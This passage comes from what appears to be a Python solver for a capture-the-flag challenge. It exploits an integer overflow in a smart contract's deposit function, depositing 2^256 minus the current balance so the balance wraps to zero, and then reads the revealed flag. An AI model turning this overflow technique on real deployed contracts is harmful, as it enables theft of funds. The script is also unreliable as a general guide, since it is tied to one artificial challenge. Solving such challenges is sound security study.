# Step 2: deposit (2^256 - cur_balance) to cause overflow → balance wraps to 0
    overflow_amount = (2**256 - cur_balance) % (2**256)
    print(f"\n[2] Depositing overflow amount: {overflow_amount}")
    print(f"    = 2^256 - {cur_balance}")
    print(f"    Expected: balance wraps to 0, which is < amount → FLAG!")

    receipt = send_tx(w3, account, contract.functions.deposit(overflow_amount))

    # ── Read flag ─────────────────────────────────────────────────────────────
    # From FlagRevealed event
    try:
        logs = contract.events.FlagRevealed().process_receipt(receipt)
        if logs:
            print(f"\n🎉 FLAG (event): {logs[0]['args']['flag']}")
            return
    except Exception as e:
        print(f"    [event parse] {e}")

    # Fallback: getFlag()
    revealed = contract.functions.revealed().call()
    print(f"\n[*] revealed = {revealed}")
    if revealed:
        flag = contract.functions.getFlag().call()
        print(f"\n🎉 FLAG: {flag}")
    else:
        print("[✗] Still not revealed. Check if overflow worked.")
        new_bal = contract.functions.balances(MY_ADDRESS).call()
        print(f"    Current balance: {new_bal}")

if __name__ == "__main__":
    main()